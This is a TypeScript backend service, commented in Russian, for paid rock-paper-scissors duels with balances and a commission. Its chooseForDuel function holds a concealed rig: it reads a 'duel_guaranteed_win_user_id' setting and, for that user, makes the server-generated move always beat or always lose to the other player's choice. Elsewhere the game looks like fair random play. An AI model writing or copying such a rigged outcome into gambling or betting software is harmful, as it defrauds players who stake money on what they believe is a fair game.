import { BalanceModel } from "../models/Balance";
import { UserModel } from "../models/User";
import pool from "../database/pool";

export interface RPSDuel {
  id: number;
  creator_id: number;
  creator_name: string;
  bet_amount: number;
  status: string;
  created_at: string;
}

export interface RPSDuelResult {
  success: boolean;
  duelId: number;
  creatorChoice: string;
  opponentChoice: string;
  winnerId: number | null;
  winAmount: number;
  commission: number;
  creatorBalance: number;
  opponentBalance: number;
  isDraw: boolean;
}

export class RPSDuelService {
  /**
   * Выбор для КНБ с учетом гарантированных побед
   */
  private static async chooseForDuel(userId: number, opponentId: number, userChoice: string): Promise<string> {
    // Проверяем есть ли у пользователя гарантированные победы
    const settings = await pool.query(
      "SELECT value FROM settings WHERE key = 'duel_guaranteed_win_user_id'"
    );
    const guaranteedWinUserId = parseInt(settings.rows[0]?.value || '0');

    // Если у этого пользователя гарантированные победы
    if (guaranteedWinUserId === userId && guaranteedWinUserId !== 0) {
      console.log(`🪨 ГАРАНТИРОВАННАЯ ПОБЕДА для пользователя ${userId}`);
      // Возвращаем выбор, который победит выбор пользователя
      if (userChoice === 'rock') return 'paper';
      if (userChoice === 'paper') return 'scissors';
      if (userChoice === 'scissors') return 'rock';
    }

    // Если у противника гарантированные победы
    if (guaranteedWinUserId === opponentId && guaranteedWinUserId !== 0) {
      console.log(`🪨 Противник ${opponentId} имеет гарантированную победу`);
      // Возвращаем выбор, который проиграет выбору оппонента
      if (userChoice === 'rock') return 'scissors';
      if (userChoice === 'paper') return 'rock';
      if (userChoice === 'scissors') return 'paper';
    }

    // Обычный случайный выбор
    const choices = ['rock', 'paper', 'scissors'];
    return choices[Math.floor(Math.random() * 3)];
  }

  /**
   * Определить победителя в КНБ
   */
  private static determineWinner(choice1: string, choice2: string): number {
    if (choice1 === choice2) return 0; // Ничья
    if (
      (choice1 === 'rock' && choice2 === 'scissors') ||
      (choice1 === 'paper' && choice2 === 'rock') ||
      (choice1 === 'scissors' && choice2 === 'paper')
    ) {
      return 1; // Игрок 1 победил
    }
    return 2; // Игрок 2 победил
  }

  /**
   * Создать дуэль КНБ
   */
  static async createDuel(userId: number, betAmount: number): Promise<{ success: boolean; duelId: number; message?: string }> {
    const client = await pool.connect();
    try {
      await client.query("BEGIN");

      // Проверяем баланс
      const balance = await BalanceModel.getByUserId(userId);
      if (!balance || balance.balance < betAmount) {
        throw new Error("Insufficient balance");
      }

      // Списываем ставку
      await client.query(
        "UPDATE balances SET balance = balance - $1 WHERE user_id = $2",
        [betAmount, userId]
      );

      // Получаем ID игры КНБ
      const gameResult = await client.query(
        "SELECT id FROM games WHERE type = 'rps' LIMIT 1"
      );
      const gameId = gameResult.rows[0]?.id || 1;

      // Создаем дуэль
      const result = await client.query(
        `INSERT INTO duels (game_id, creator_id, bet_amount, status)
         VALUES ($1, $2, $3, 'waiting')
         RETURNING id`,
        [gameId, userId, betAmount]
      );

      const duelId = result.rows[0].id;

      await client.query("COMMIT");

      return {
        success: true,
        duelId,
        message: "Duel created successfully"
      };
    } catch (error) {
      await client.query("ROLLBACK");
      throw error;
    } finally {
      client.release();
    }
  }

  /**
   * Присоединиться к дуэли КНБ
   */
  static async joinDuel(userId: number, duelId: number, choice: string): Promise<RPSDuelResult> {
    const client = await pool.connect();
    try {
      await client.query("BEGIN");

      // Получаем дуэль
      const duelResult = await client.query(
        "SELECT * FROM duels WHERE id = $1 AND status = 'waiting'",
        [duelId]
      );

      if (duelResult.rows.length === 0) {
        throw new Error("Duel not found or already completed");
      }

      const duel = duelResult.rows[0];

      // Проверяем, что это не создатель дуэли
      if (duel.creator_id === userId) {
        throw new Error("You cannot join your own duel");
      }

      // Проверяем баланс
      const balance = await BalanceModel.getByUserId(userId);
      if (!balance || balance.balance < duel.bet_amount) {
        throw new Error("Insufficient balance");
      }

      // Списываем ставку
      await client.query(
        "UPDATE balances SET balance = balance - $1 WHERE user_id = $2",
        [duel.bet_amount, userId]
      );

      // Генерируем выбор создателя
      const creatorChoice = await this.chooseForDuel(duel.creator_id, userId, choice);

      // Определяем победителя
      const winner = this.determineWinner(creatorChoice, choice);

      // Получаем комиссию
      const commissionSettings = await client.query(
        "SELECT value FROM settings WHERE key = 'duel_commission_rate'"
      );
      const commissionRate = parseFloat(commissionSettings.rows[0]?.value || '0.09');

      let winnerId: number | null = null;
      let isDraw = false;
      let commission = 0;
      let winAmount = 0;

      if (winner === 0) {
        // Ничья - возвращаем ставки
        isDraw = true;
        await client.query(
          "UPDATE balances SET balance = balance + $1 WHERE user_id = $2",
          [duel.bet_amount, duel.creator_id]
        );
        await client.query(
          "UPDATE balances SET balance = balance + $1 WHERE user_id = $2",
          [duel.bet_amount, userId]
        );
      } else {
        // Есть победитель
        winnerId = winner === 1 ? duel.creator_id : userId;
        const totalPot = duel.bet_amount * 2;
        commission = totalPot * commissionRate;
        winAmount = totalPot - commission;

        // Начисляем выигрыш победителю
        await client.query(
          "UPDATE balances SET balance = balance + $1 WHERE user_id = $2",
          [winAmount, winnerId]
        );
      }

      // Обновляем статус дуэли
      await client.query(
        `UPDATE duels SET
         opponent_id = $1,
         status = 'completed',
         winner_id = $2,
         completed_at = NOW()
         WHERE id = $3`,
        [userId, winnerId, duelId]
      );

      // Получаем новые балансы
      const creatorBalanceResult = await client.query(
        "SELECT balance FROM balances WHERE user_id = $1",
        [duel.creator_id]
      );
      const opponentBalanceResult = await client.query(
        "SELECT balance FROM balances WHERE user_id = $1",
        [userId]
      );

      await client.query("COMMIT");

      return {
        success: true,
        duelId,
        creatorChoice,
        opponentChoice: choice,
        winnerId,
        winAmount,
        commission,
        creatorBalance: parseFloat(creatorBalanceResult.rows[0].balance),
        opponentBalance: parseFloat(opponentBalanceResult.rows[0].balance),
        isDraw
      };
    } catch (error) {
      await client.query("ROLLBACK");
      throw error;
    } finally {
      client.release();
    }
  }

  /**
   * Получить список доступных дуэлей
   */
  static async getAvailableDuels(userId: number): Promise<RPSDuel[]> {
    const result = await pool.query(
      `SELECT d.id, d.creator_id, u.first_name || ' ' || COALESCE(u.last_name, '') as creator_name,
              d.bet_amount, d.status, d.created_at
       FROM duels d
       JOIN users u ON d.creator_id = u.telegram_id
       WHERE d.status = 'waiting' AND d.creator_id != $1
       AND d.game_id = (SELECT id FROM games WHERE type = 'rps' LIMIT 1)
       ORDER BY d.created_at DESC
       LIMIT 20`,
      [userId]
    );

    return result.rows;
  }

  /**
   * Отменить дуэль
   */
  static async cancelDuel(userId: number, duelId: number): Promise<{ success: boolean; message: string }> {
    const client = await pool.connect();
    try {
      await client.query("BEGIN");

      // Получаем дуэль
      const duelResult = await client.query(
        "SELECT * FROM duels WHERE id = $1 AND status = 'waiting'",
        [duelId]
      );

      if (duelResult.rows.length === 0) {
        throw new Error("Duel not found or already completed");
      }

      const duel = duelResult.rows[0];

      // Проверяем, что это создатель дуэли
      if (duel.creator_id !== userId) {
        throw new Error("You can only cancel your own duels");
      }

      // Возвращаем ставку
      await client.query(
        "UPDATE balances SET balance = balance + $1 WHERE user_id = $2",
        [duel.bet_amount, userId]
      );

      // Удаляем дуэль
      await client.query(
        "DELETE FROM duels WHERE id = $1",
        [duelId]
      );

      await client.query("COMMIT");

      return {
        success: true,
        message: "Duel cancelled successfully"
      };
    } catch (error) {
      await client.query("ROLLBACK");
      throw error;
    } finally {
      client.release();
    }
  }
}
